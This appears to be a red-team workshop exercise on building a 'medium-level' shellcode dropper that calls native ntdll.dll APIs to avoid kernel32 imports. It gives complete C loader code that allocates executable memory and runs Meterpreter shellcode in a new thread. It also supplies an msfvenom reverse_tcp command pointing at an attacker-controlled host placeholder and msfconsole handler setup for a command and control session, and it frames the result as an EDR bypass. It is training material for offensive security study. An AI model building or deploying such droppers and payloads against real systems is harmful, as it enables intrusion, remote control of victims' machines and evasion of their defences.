## Exercise 3: Medium_Level_API_Dropper
In this exercise we will make the first modification to the Win32 dropper, replacing the Windows APIs (kernel32.dll) with native APIs (ntdll.dll). We will create a **medium-level API shellcode dropper** and call it a native dropper.
![medium_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235372969-4d24ddec-7ee5-443e-966a-24b3d70dc3a8.png)



## Exercice 3 tasks:
### Creating the Win32 Dropper
1. Download the native dropper POC from the Code section of this chapter.
2. The code in the POC is partially complete. Following the instructions in this playbook, you need to finish the part where the four native functions are loaded from ntdll.dll. 
3. Then create x64 meterpreter shellcode and copy it into the POC.  
4. Compile the POC as a x64 release. 
5. Create and run a staged x64 meterpreter listener using msfconsole.
6. Run your compiled .exe and check that a stable command and control channel opens. 
### Analysing the Direct Syscall Dropper
6. Use the Visual Studio **dumpbin** tool to analyse the native dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
7. Use **x64dbg** to debug or analyse the dropper. 
     - Check which Win32 APIs and native APIs are being imported. If they are being imported, from which module or memory location are they being imported? Is the result what you expected?
     - Check from which module or memory location the syscalls for the four APIs used are being executed. Is the result what you expected? 


## Visual Studio
You can download the POC from the code section of this chapter. In this POC, we replace all the Win32 APIs we used before with the corresponding native function or API.
- NtAllocateVirtualMemory
- NtWriteVirtualMemory
- NtCreateThreadEx
- NtWaitForSingleObject

The code works as follows. Unlike the Windows APIs, most of the native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. To use the native APIs in our Native Dropper, we need to manually define the function pointers for the native APIs. This part is already fully implemented in the Native Dropper POC.
<details>
    
 ```
 // Define function pointers for native API functions
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* PNTCLOSE)(HANDLE);
typedef NTSTATUS(NTAPI* PNTFREEVIRTUALMEMORY)(HANDLE, PVOID*, PSIZE_T, ULONG);
 ```
</details>
    
    
Shellcode declaration same as before in the Win32 Dropper.
<details>

```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
</details>


To load the native functions directly from ntdll.dll, we need to load them manually from ntdll.dll. This code part is not finished and must be completed by the workshop attendee. In the native dropper POC you will see, that the code for the native function ``NtAllocateVirtualMemory`` is already written and based on that schema you have to complete it for the other three native functions ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.
<details>
    
```
// Load native API functions from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
    PNTCLOSE NtClose = (PNTCLOSE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory = (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
```    
</details>    

For memory allocation, we replace the Windows API VirtualAlloc with the native API **NtAllocateVirtualMemory**.
<details>
    
```    
// Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```    
</details>    

For shellcode copying, we replace the Windows API WriteProcessMemory with the native API **NtWriteVirtualMemory**.
<details>
    
```
// Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);    
```
</details>    
    

For shellcode execution, we replace the Windows API CreateThread with the native API **NtCreateThreadEx**.
<details>
    
```
// Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
```
</details>

And finally we have to replace the Windows API WaitForSingleObject with the native API **NtWaitForSingleObject**.
<details>
    
```
// Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);
```
</details>    

Here is the **complete code**, and you can copy and paste this code into your **Medium-Level-Dropper** project in Visual Studio.
You can also download the complete **Medium-Level-Dropper Visual Studio project** in the **Code Example section** of this repository.
<details>
    
```
#include <stdio.h>
#include <windows.h>
#include <winternl.h>

// Define function pointers for native API functions
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* PNTCLOSE)(HANDLE);
typedef NTSTATUS(NTAPI* PNTFREEVIRTUALMEMORY)(HANDLE, PVOID*, PSIZE_T, ULONG);


int main() {

    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Load native API functions from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
    PNTCLOSE NtClose = (PNTCLOSE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory = (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");


    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 as the main function exit code
    return 0;

}
```
</details>

    
## Meterpreter Shellcode
Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
 **kali>**   
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the Medium-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>    


## MSF-Listener
Before we test the functionality of our Medium-Level-Dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled Medium-Level-Dropper.exe. If all goes well, you should see an incoming command and control session. 
<details>
    
<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>


## Medium-Level-Dropper analysis: dumpbin 
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
<details>    
    
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports medium_level.exe
```
</details>    

<details>
    <summary>Solution</summary>    
Compared to the High-Level-Dropper, you can see that the medium-level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
<p align="center">
<img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
</p>
</details>    

## Medium-Level-Dropper analysis: API-Monitor
For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in context of the used APIs in our Medium-Level-Dropper. We filter on the following API calls:
- VirtualAlloc
- NtAllocateVirtualMemory
- WriteProcessMemory
- NtWriteVirtualMemory
- CreateThread
- NtCreateThreadEx
- WaitForSingleObject
- NtWaitForSingleObject

<details>
    <summary>Solution</summary>    
If everything was done correctly, you could observe that there are more transitions from the Windows APIs to the native APIs we used in our Medium-Level-Dropper poc.
This result was expected and is correct because our Medium-Level-Dropper accesses or imports the needed native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject directly from ntdll.dll.
<p align="center">
<img width="522" alt="image" src="https://user-images.githubusercontent.com/50073731/235374864-c7e90dd6-82c6-49d1-a90c-b80a531416b3.png">
</p>
</details>    

## Medium-Level-Dropper analysis: x64dbg 
Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
Remember, so far we have not implemented system calls or system call stubs directly in the dropper. What results would you expect?
<details>
    <summary>Solution</summary>
    
1. Open or load your Medium-Level-Dropper.exe into x64dbg
2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight **ntdll.dll**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. 
    
<p align="center">    
<img width="867" alt="image" src="https://user-images.githubusercontent.com/50073731/235445644-240e5c3b-a3cf-4a7a-99be-27412e2dcb82.png">
</p>
    
As expected, we can observe that the corresponding system calls for the native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject are correctly executed/imported from the .text section in the ntdll.dll module. This investigation is very important because later in the direct syscall exercise we expect a different result with the low level dropper and want to match it.
    
<p align="center">    
<img width="686" alt="image" src="https://user-images.githubusercontent.com/50073731/235445865-c3fe83fa-1539-4ff3-b850-96cc91a0a01d.png">
</p>    
</details>


## Summary: Medium-level API Dropper
- We made the transition from high-level APIs to medium-level APIs, or from Windows APIs to native APIs.
- But still no direct use of system calls
- Syscall execution via medium_level_dropper.exe -> ntdll.dll -> syscall
- Dropper no longer imports Windows APIs from kernel32.dll
- In case of EDR would only hook kernel32.dll -> EDR bypassed 
